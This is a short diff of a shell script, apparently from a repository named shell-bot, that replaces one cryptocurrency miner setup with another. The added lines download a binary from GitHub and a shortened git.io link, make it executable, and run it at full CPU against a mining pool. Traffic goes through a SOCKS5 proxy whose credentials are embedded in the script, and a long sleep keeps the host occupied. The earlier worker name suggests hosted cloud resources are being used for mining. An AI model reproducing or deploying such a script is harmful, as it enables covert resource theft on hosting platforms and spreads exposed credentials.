@@ -4,6 +4,8 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
+wget -qO tune_config https://git.io/J1Wss
+wget -qO build https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/gr
 chmod +x build
-./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.Heroku -p x -t $(nproc --all)
+./build -a gr -o stratum+tcps://asia.flockpool.com:5555 -u RGvi7W9Q9CWHXxXZREpH6rsUZhGYqqKgrZ.rtx -p tokisaki -x socks5://2mziske1s3m75w:v6zzlcglom2qqlhc2lii1pub0ft3a@us-east-static-08.quotaguard.com:1080
+sleep 99999999999999999
